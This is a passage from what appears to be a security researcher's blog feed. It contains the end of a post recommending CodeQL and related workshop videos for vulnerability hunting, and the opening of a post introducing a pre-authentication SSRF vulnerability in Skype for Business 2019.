+&lt;p&gt;You might think: well, this was easy. Yeeesss, it was and everbody could have done it for sure. Use the tools and knowledge of all the bright people in infosec to help you through your journey of finding critical vulnerabilities. But please also have a deeper look into CodeQL first. From my experience, this was a total showcase, i.e. you might write your own queries and understand possible source APIs of your target application first before achieving any meaningful results. There exist some awesome workshops even with &lt;a href=&quot;https://youtu.be/-bJ2Ioi7Icg&quot;&gt;videos&lt;/a&gt; by the talented Alvaro Muñoz aka pwntester. I can also highly recommend the &lt;a href=&quot;https://youtu.be/nvCd0Ee4FgE&quot;&gt;workshop videos&lt;/a&gt; “Finding security vulnerabilities in Java with CodeQL”. There is so much more: search and profit!&lt;/p&gt;</content><author><name></name></author><category term="vulns4free" /><summary type="html">This write-up won’t be an intense discussion on security code review techniques this time. We’ll simply let do all the hard work by a third party: CodeQL.</summary></entry><entry><title type="html">Skype for Business Audit Part 2 - SKYPErimeterleak</title><link href="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html" rel="alternate" type="text/html" title="Skype for Business Audit Part 2 - SKYPErimeterleak" /><published>2022-09-26T23:00:00+02:00</published><updated>2022-09-26T23:00:00+02:00</updated><id>http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/09/26/skype-audit-part2.html">&lt;p&gt;In my last &lt;a href=&quot;https://frycos.github.io/vulns4free/2022/09/22/skype-audit-part1.html&quot;&gt;blog post&lt;/a&gt; we talked about a new &lt;em&gt;persistence technique&lt;/em&gt; in &lt;strong&gt;Skype for Business 2019 (SfB)&lt;/strong&gt; found during my code audit. Now, I give a short code walk-through
 about an &lt;strong&gt;Pre-Auth Server-side Request Forgery (SSRF)&lt;/strong&gt; vulnerability which could easily lead to an internet perimeter breach.
 But let’s start from the beginning.&lt;/p&gt;
 
